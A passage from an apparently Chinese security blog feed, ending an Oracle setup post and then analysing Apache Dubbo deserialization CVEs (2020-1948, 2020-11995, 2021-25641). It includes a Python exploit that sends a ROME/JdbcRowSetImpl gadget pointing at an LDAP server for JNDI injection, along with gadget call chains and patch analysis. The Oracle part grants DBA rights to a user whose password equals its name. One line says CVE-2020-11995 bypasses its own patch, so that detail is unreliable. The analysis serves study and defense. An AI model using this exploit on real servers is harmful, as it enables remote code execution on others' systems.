src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230519140316085.png"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>打开cmd命令行</p><div class="code-wrapper"><pre><code class="hljs actionscript">sqlplus / <span class="hljs-keyword">as</span> sysdba</code></pre></div><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><div class="code-wrapper"><pre><code class="hljs pgsql">#创建临时表空间<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TEMPORARY</span> <span class="hljs-keyword">TABLESPACE</span> firsttmpspacea TEMPFILE <span class="hljs-string">&#x27;C:\oracle11g\firsttmpspacea.dbf&#x27;</span> SIZE <span class="hljs-number">50</span>M;#创建表空间<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLESPACE</span> firstspace DATAFILE <span class="hljs-string">&#x27;C:\oracle11g\firstspace.dbf&#x27;</span> SIZE <span class="hljs-number">100</span>M;#创建数据库#创建用户<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> user01 IDENTIFIED <span class="hljs-keyword">BY</span> user01 <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">TABLESPACE</span> firstspace <span class="hljs-keyword">TEMPORARY</span> <span class="hljs-keyword">TABLESPACE</span> firsttmpspacea;#授权数据库连接<span class="hljs-keyword">grant</span> dba,<span class="hljs-keyword">connect</span> <span class="hljs-keyword">to</span> user01;</code></pre></div><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#查看数据库名称</span>SELECT name FROM v<span class="hljs-variable">$database</span>;**#**查看所有表****SELECT table_name FROM all_tables;<span class="hljs-comment">#查看所有数据库</span>SELECT instance_name, status FROM v<span class="hljs-variable">$instance</span>;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Database</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Dubbo系列漏洞</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-Dubbo%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Apache-Dubbo%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-1948"><a href="#CVE-2020-1948" class="headerlink" title="CVE-2020-1948"></a>CVE-2020-1948</h1><h2 id="漏洞通告"><a href="#漏洞通告" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><p><a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html">https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html</a></p><h2 id="利用方式一"><a href="#利用方式一" class="headerlink" title="利用方式一"></a>利用方式一</h2><p>利用provider查找不存在的服务抛出异常时隐式调用toString方法作为入口点</p><p>python代码</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> dubbo.codec.hessian2 import Decoder,new_object<span class="hljs-keyword">from</span> dubbo.client import DubboClient<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:   <span class="hljs-built_in"> client </span>= DubboClient(<span class="hljs-string">&#x27;10.58.120.200&#x27;</span>, 20880)    JdbcRowSetImpl = new_object(        <span class="hljs-string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,        <span class="hljs-attribute">dataSource</span>=<span class="hljs-string">&quot;ldap://10.58.120.200:1389/vg1wxo&quot;</span>,        strMatchColumns=[<span class="hljs-string">&quot;foo&quot;</span>]    )    JdbcRowSetImplClass = new_object(        <span class="hljs-string">&#x27;java.lang.Class&#x27;</span>,        <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,    )    toStringBean = new_object(        <span class="hljs-string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,        <span class="hljs-attribute">beanClass</span>=JdbcRowSetImplClass,        <span class="hljs-attribute">obj</span>=JdbcRowSetImpl    )    resp = client.send_request_and_return_response(        <span class="hljs-attribute">service_name</span>=<span class="hljs-string">&#x27;any_name&#x27;</span>,        <span class="hljs-attribute">method_name</span>=<span class="hljs-string">&#x27;any_method&#x27;</span>,        args=[toStringBean])    <span class="hljs-built_in">print</span>(resp)</code></pre></div><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点在org.apache.dubbo.rpc.RpcInvocation#toString方法中的<code>Arrays.toString(this.arguments)</code>，其中的<code>this.arguments</code>是可控的</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RpcInvocation [methodName=&quot;</span> + <span class="hljs-built_in">this</span>.methodName + <span class="hljs-string">&quot;, parameterTypes=&quot;</span> + Arrays.toString(<span class="hljs-built_in">this</span>.parameterTypes) + <span class="hljs-string">&quot;, arguments=&quot;</span> + Arrays.toString(<span class="hljs-built_in">this</span>.arguments) + <span class="hljs-string">&quot;, attachments=&quot;</span> + <span class="hljs-built_in">this</span>.attachments + <span class="hljs-string">&quot;]&quot;</span>;&#125;</code></pre></div><p>在org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol#getInvoker方法中下断点，首先在inv对象的attachments中获取path值，此处path字段是provider中一个不存在的服务名</p><p> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215111707711.png"> </p><p>再根据获取到的port，path等信息获取serviceKey字符串，再从exporterMap中根据serviceKey值获取exporter，如果exporter为空则抛出异常</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215111803120.png"> </p><p>在new RemotingException()的构造函数中进行了字符串与对象的拼接，其中包含inv对象。</p><blockquote><p>当对象与字符串拼接时会隐式调用StringBuilder.append(obj)–&gt;String.valueOf(obj)–&gt;obj.toString方法</p></blockquote><div class="code-wrapper"><pre><code class="hljs lisp">throw new RemotingException(<span class="hljs-name">channel</span>, <span class="hljs-string">&quot;Not found exported service: &quot;</span> + serviceKey + <span class="hljs-string">&quot; in &quot;</span> + this.exporterMap.keySet() + <span class="hljs-string">&quot;, may be version or group mismatch , channel: consumer: &quot;</span> + channel.getRemoteAddress() + <span class="hljs-string">&quot; --&gt; provider: &quot;</span> + channel.getLocalAddress() + <span class="hljs-string">&quot;, message:&quot;</span> + inv)<span class="hljs-comment">;</span></code></pre></div><p>多次强制步入到inv对象的append方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215113415701.png"> </p><p>进入valueOf方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215113353578.png"> </p><p>进入toString方法，来到org.apache.dubbo.rpc.RpcInvocation#toString方法，在<code>Arrays.toString(this.arguments)</code>中，参数是我们传入的对象数组</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215113549921.png"> </p><p>进入Arrays.toString()方法，内部循环遍历对象数组调用String.valueOf()方法，a[i]为ToStringBean对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215113849147.png"> </p><p>继续进入String.valueOf(a[i])方法，即将调用ToStringBean对象的toString方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215114138115.png">  </p><p>ToStringBean.toString方法中会遍历其所有getter方法，会调用到getDatabaseMetaData方法，最后实现jndi注入</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215144911529.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215145037113.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215145142797.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215145153232.png"> </p><p><strong>调用链</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com<span class="hljs-selector-class">.sun</span>.rowset)getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com<span class="hljs-selector-class">.sun</span>.rowset)invoke:-<span class="hljs-number">1</span>, GeneratedMethodAccessor11 (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)toString:<span class="hljs-number">158</span>, ToStringBean (com<span class="hljs-selector-class">.rometools</span><span class="hljs-selector-class">.rome</span><span class="hljs-selector-class">.feed</span>.impl)toString:<span class="hljs-number">129</span>, ToStringBean (com<span class="hljs-selector-class">.rometools</span><span class="hljs-selector-class">.rome</span><span class="hljs-selector-class">.feed</span>.impl)valueOf:<span class="hljs-number">2994</span>, String (java.lang)toString:<span class="hljs-number">4571</span>, Arrays (java.util)toString:<span class="hljs-number">429</span>, RpcInvocation (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span>.rpc)valueOf:<span class="hljs-number">2994</span>, String (java.lang)append:<span class="hljs-number">131</span>, StringBuilder (java.lang)getInvoker:<span class="hljs-number">265</span>, DubboProtocol (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)reply:<span class="hljs-number">120</span>, DubboProtocol$<span class="hljs-number">1</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)handleRequest:<span class="hljs-number">100</span>, HeaderExchangeHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.exchange</span><span class="hljs-selector-class">.support</span>.header)received:<span class="hljs-number">175</span>, HeaderExchangeHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.exchange</span><span class="hljs-selector-class">.support</span>.header)received:<span class="hljs-number">51</span>, DecodeHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span>.transport)run:<span class="hljs-number">57</span>, ChannelEventRunnable (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.transport</span>.dispatcher)runWorker:<span class="hljs-number">1142</span>, ThreadPoolExecutor (java<span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">617</span>, ThreadPoolExecutor<span class="hljs-variable">$Worker</span> (java<span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">745</span>, Thread (java.lang)</code></pre></div><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.4...dubbo-2.7.5#diff-2568ebdce1edca56f363ca597550d02cd4cd8b454ab78eb858acfded7362e821">https://github.com/apache/dubbo/compare/dubbo-2.7.4...dubbo-2.7.5#diff-2568ebdce1edca56f363ca597550d02cd4cd8b454ab78eb858acfded7362e821</a></p><p>官方增加了getInvocationWithoutData方法对inv对象处理</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215120435608.png"> </p><p>在getInvocationWithoutData方法中将inv对象的arguments置空</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215120546780.png"> </p><h2 id="利用方式二"><a href="#利用方式二" class="headerlink" title="利用方式二"></a>利用方式二</h2><p>利用org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)方法对传入的服务名、方法名、方法描述校验缺陷，攻击者可以构造恶意对象，利用dubbo的反序列化器实现反序列化</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在decode方法处下断点，首先根据<code>this.serializationType</code>获取序列化器</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215140018492.png"></p><p>进入getSerialization方法，通过<code>getSerializationById()</code>方法根据id获取<code>Serialization</code>对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215140246934.png"></p><p>进入<code>getSerializationById()</code>方法，从<code>ID_SERIALIZATION_MAP</code>中获取对象，id为2获取的对象是Hessian2Serialization</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215140454292.png"> </p><p>获取到<code>Serialization</code>对象后，调用deserialize方法反序列化，即创建一个Hessian2ObjectInput对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215140919382.png"></p><p>再从Hessian2ObjectInput对象中依次读取dubbo版本，服务名path，方法名，方法描述符等值</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215141051284.png"></p><p>接下来分别创建了对象数组args和类数组pts，再根据服务名path在注册的服务中查找服务</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215141413583.png"></p><p>当serviceDescriptor为空，则根据方法描述符创建类数组对象赋值给pts，再创建以新的对象数组赋值给args，长度为pts类数组的长度，然后循环遍历args对象数组进行readObject反序列化对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215141624048.png"> </p><p>进入in.readObject方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215142212117.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215142232059.png"></p><p>进入到com.alibaba.com.caucho.hessian.io.Hessian2Input#readObject(java.lang.Class, java.lang.Class&lt;?&gt;…)方法，根据tag值进入分支处理</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215142430668.png"> </p><p>此处tag值为72，首先根据exprctedClass获取获取Deserializer反序列化器</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215142610026.png"> </p><p>进入getDeserializer方法，首先在<code>_staticDeserializerMap</code>中获取，再在<code>_cachedDeserializerMap</code>中获取对应的反序列化器</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215143143929.png"> </p><p>获取到对应的反序列化器后，带调用readMap方法读取Map对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215143255580.png"></p><p>来到MapDeserializer.readMap()方法，首先创建一个map对象，在调用doReadMap方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215143905955.png"> </p><p>在doReadMap方法中，循环从Hessian2Input输入流中读取键值对对象并HashMap.put()到map对象中</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215143821287.png"> </p><p>反序列化完键值对后进入put方法，key和value都是EqualsBean对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215144608978.png"></p><p>由此便进入到ROME调用链，进入到ToStringBean.toString方法中，获取所有getter方法，最终通过getDatabaseMetaData()方法实现JNDI注入</p><p><strong>调用链</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">lookup:<span class="hljs-number">417</span>, InitialContext (javax.naming)connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com<span class="hljs-selector-class">.sun</span>.rowset)getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com<span class="hljs-selector-class">.sun</span>.rowset)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)toString:<span class="hljs-number">158</span>, ToStringBean (com<span class="hljs-selector-class">.rometools</span><span class="hljs-selector-class">.rome</span><span class="hljs-selector-class">.feed</span>.impl)toString:<span class="hljs-number">129</span>, ToStringBean (com<span class="hljs-selector-class">.rometools</span><span class="hljs-selector-class">.rome</span><span class="hljs-selector-class">.feed</span>.impl)beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com<span class="hljs-selector-class">.rometools</span><span class="hljs-selector-class">.rome</span><span class="hljs-selector-class">.feed</span>.impl)hashCode:<span class="hljs-number">180</span>, EqualsBean (com<span class="hljs-selector-class">.rometools</span><span class="hljs-selector-class">.rome</span><span class="hljs-selector-class">.feed</span>.impl)hash:<span class="hljs-number">338</span>, HashMap (java.util)put:<span class="hljs-number">611</span>, HashMap (java.util)doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)readMap:<span class="hljs-number">126</span>, MapDeserializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)readObject:<span class="hljs-number">2093</span>, Hessian2Input (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)readObject:<span class="hljs-number">2074</span>, Hessian2Input (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.com</span><span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)readObject:<span class="hljs-number">92</span>, Hessian2ObjectInput (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.serialize</span>.hessian2)decode:<span class="hljs-number">139</span>, DecodeableRpcInvocation (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decode:<span class="hljs-number">79</span>, DecodeableRpcInvocation (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decode:<span class="hljs-number">57</span>, DecodeHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span>.transport)received:<span class="hljs-number">44</span>, DecodeHandler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span>.transport)run:<span class="hljs-number">57</span>, ChannelEventRunnable (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.transport</span>.dispatcher)runWorker:<span class="hljs-number">1142</span>, ThreadPoolExecutor (java<span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">617</span>, ThreadPoolExecutor<span class="hljs-variable">$Worker</span> (java<span class="hljs-selector-class">.util</span>.concurrent)run:<span class="hljs-number">745</span>, Thread (java.lang)</code></pre></div><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0</a></p><p>官方在org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)方法中对方法名进行了校验，如果客户端传入的方法名不是<code>$INVOKE</code>、<code>$INVOKE_ASYNC</code>或<code>$ECHO</code>则抛出异常</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215145603180.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215145633998.png">   </p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/7969">https://xz.aliyun.com/t/7969</a></p><p><a href="http://rui0.cn/archives/1338">http://rui0.cn/archives/1338</a></p><h1 id="CVE-2020-11995"><a href="#CVE-2020-11995" class="headerlink" title="CVE-2020-11995"></a>CVE-2020-11995</h1><h2 id="漏洞通告-1"><a href="#漏洞通告-1" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><p><a href="https://lists.apache.org/thread/jnmy3z0obmq6j0nlnqmv79yv35jjh01x">https://lists.apache.org/thread/jnmy3z0obmq6j0nlnqmv79yv35jjh01x</a></p><p>该漏洞是CVE-2020-11995补丁的绕过，当客户端传入的方法名是<code>$INVOKE</code>、<code>$INVOKE_ASYNC</code>或<code>$ECHO</code>时，依然会根据方法的描述类型获取对应的反序列化器，再构造对应的恶意对象触发反序列化链</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>分析过程同CVE-2020-1948，这里仅分析差异</p><p>进入到pts类数组判断，增加了对方法名称的判断</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215151501509.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215151719257.png"> </p><p> 当传入的方法名是<code>$INVOKE</code>、<code>$INVOKE_ASYNC</code>或<code>$ECHO</code>时即可绕过该校验</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215151838031.png"></p><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>同CVE-2020-1948</p><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>对客户端传入的方法描述符进行了校验，当方法描述符不是<code>Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;</code>或<code>Ljava/lang/Object;</code>时抛出异常</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213103058680.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213103201659.png"> </p><h1 id="CVE-2021-25641"><a href="#CVE-2021-25641" class="headerlink" title="CVE-2021-25641"></a>CVE-2021-25641</h1><h2 id="漏洞通告-2"><a href="#漏洞通告-2" class="headerlink" title="漏洞通告"></a>漏洞通告</h2><p><a href="https://lists.apache.org/thread/g129y1xjtcxswjj506pvzmlbzfvtmsqw">https://lists.apache.org/thread/g129y1xjtcxswjj506pvzmlbzfvtmsqw</a></p><p>Dubbo的consumer端可指定provider端使用的序列化协议，默认使用的是Hessian2Serialization反序列化器，该漏洞是利用KyroSerialization或FstSerialization反序列化器中的缺陷实现反序列化</p><h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="Kryo反序列化"><a href="#Kryo反序列化" class="headerlink" title="Kryo反序列化"></a>Kryo反序列化</h3><p>在DecodeableRpcInvocation#decode方法内下断点，首先根据<code>this.serializationType</code>获取序列化器</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215154035191.png"> </p><p>进入getSerialization方法，由<code>getSerializationById(id)</code>方法根据id获取Serialization对象，继续进入getSerializationById()</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215154144401.png"></p><p>id为8，获取的是KryoSerialization</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215154337974.png"></p><p>获取到Serialization对象后，调用deserialize方法反序列化对象，即创建一个KryObjectInput对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215162037844.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215154520305.png"></p><p>随后再获取传入的版本，服务名，方法名，方法描述符，再根据方法描述符是否为空选择创建pts类数组对象和args对象数组</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215162252813.png"></p><p>再从输入流中根据类数组的类型恢复参数</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215163113838.png"></p><p>进入in.readObject</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215163256977.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215163659518.png"> </p><p>进入到com.esotericsoftware.kryo.Kryo#readClassAndObject方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231215163857991.png"></p><p>后续的利用链HashMap.put()–&gt;HashMap.putVal()–&gt;org.springframework.aop.target.HotSwappableTargetSource#equals -&gt; com.sun.org.apache.xpath.internal.objects.XString#equals(java.lang.Object)-&gt;JSONObject.toString()</p><p><strong>调用链</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">newInstance:<span class="hljs-number">396</span>, Class (java.lang)getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)write:-<span class="hljs-number">1</span>, ASMSerializer_1_TemplatesImpl (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.serializer)write:<span class="hljs-number">270</span>, MapSerializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.serializer)write:<span class="hljs-number">44</span>, MapSerializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.serializer)write:<span class="hljs-number">280</span>, JSONSerializer (com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.serializer)toJSONString:<span class="hljs-number">863</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)toString:<span class="hljs-number">857</span>, JSON (com<span class="hljs-selector-class">.alibaba</span>.fastjson)equals:<span class="hljs-number">392</span>, XString (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xpath</span><span class="hljs-selector-class">.internal</span>.objects)equals:<span class="hljs-number">104</span>, HotSwappableTargetSource (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.aop</span>.target)putVal:<span class="hljs-number">634</span>, HashMap (java.util)put:<span class="hljs-number">611</span>, HashMap (java.util)read:<span class="hljs-number">162</span>, MapSerializer (com<span class="hljs-selector-class">.esotericsoftware</span><span class="hljs-selector-class">.kryo</span>.serializers)read:<span class="hljs-number">39</span>, MapSerializer (com<span class="hljs-selector-class">.esotericsoftware</span><span class="hljs-selector-class">.kryo</span>.serializers)readClassAndObject:<span class="hljs-number">813</span>, Kryo (com<span class="hljs-selector-class">.esotericsoftware</span>.kryo)readObject:<span class="hljs-number">136</span>, KryoObjectInput (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.serialize</span>.kryo)readObject:<span class="hljs-number">147</span>, KryoObjectInput (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.common</span><span class="hljs-selector-class">.serialize</span>.kryo)decode:<span class="hljs-number">116</span>, DecodeableRpcInvocation (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decode:<span class="hljs-number">73</span>, DecodeableRpcInvocation (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decodeBody:<span class="hljs-number">132</span>, DubboCodec (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span>.dubbo)decode:<span class="hljs-number">122</span>, ExchangeCodec (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.remoting</span><span class="hljs-selector-class">.exchange</span>.codec)decode:<span class="hljs-number">82</span>, ExchangeCodec (org<span class="hljs-selector-class">.apache</span><span 